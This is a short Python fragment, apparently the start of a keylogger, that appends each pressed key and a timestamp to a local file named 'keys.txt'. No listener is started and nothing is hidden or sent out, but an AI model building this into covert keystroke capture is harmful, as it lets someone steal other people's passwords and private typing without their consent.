from pathlib import Path
from datetime import datetime

log_file = Path("keys.txt")
with open(log_file, "a") as f:
    def file_check():
        if log_file.is_file():
            pass
        else:
            log_file.open('w')


    def store_time():
        now = datetime.now()
        date = now.strftime("%d %m %y")
        time = now.strftime("%H:%M:%S")
        print(date)
        f.write(date +" ")
        print(time)
        f.write(time + "\n")


    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f"[{key}]")
        except Exception as e:
            print(f"Error {e}")
